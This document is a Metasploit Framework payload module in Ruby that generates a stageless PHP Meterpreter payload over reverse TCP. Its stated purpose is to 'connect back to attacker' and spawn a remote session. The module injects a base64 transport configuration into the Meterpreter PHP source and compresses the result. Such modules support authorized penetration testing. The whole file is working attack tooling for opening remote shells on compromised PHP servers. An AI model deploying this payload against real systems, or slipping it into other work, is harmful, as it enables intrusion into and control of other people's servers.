##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Single
  include Msf::Payload::Php::ReverseTcp
  include Msf::Payload::TransportConfig
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PHP Meterpreter, Reverse TCP Inline',
        'Description' => 'Connect back to attacker and spawn a Meterpreter server (PHP)',
        'Author' => ['egypt'],
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'License' => MSF_LICENSE,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::Meterpreter_Php_Php
      )
    )

    register_options([
      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load'])
    ])
  end

  def generate_config(opts = {})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid

    opts[:transport_config] ||= [transport_config_reverse_tcp(opts)]

    config_opts = {
      ascii_str:         true,
      null_session_guid: true,
      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
      uuid:              opts[:uuid],
      transports:        opts[:transport_config],
      extensions:        (ds['EXTENSIONS'] || '').split(','),
      ext_format:        'php',
      stageless:         true,
    }.merge(meterpreter_logging_config(opts))

    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
    config.to_b
  end

  def generate(_opts = {})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')

    config_block = Rex::Text.encode_base64(generate_config(_opts))
    met = met.sub('"CONFIG_BLOCK", ""', "\"CONFIG_BLOCK\", \"#{config_block}\"")

    if datastore['MeterpreterDebugBuild']
      met.sub!(%q{define("MY_DEBUGGING", false);}, %|define("MY_DEBUGGING", true);|)

      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(datastore['MeterpreterDebugLogging'])
      met.sub!(%q{define("MY_DEBUGGING_LOG_FILE_PATH", false);}, %|define("MY_DEBUGGING_LOG_FILE_PATH", "#{logging_options[:rpath]}");|) if logging_options[:rpath]
    end

    met.gsub!(/#.*$/, '')
    Rex::Text.compress(met)
  end
end
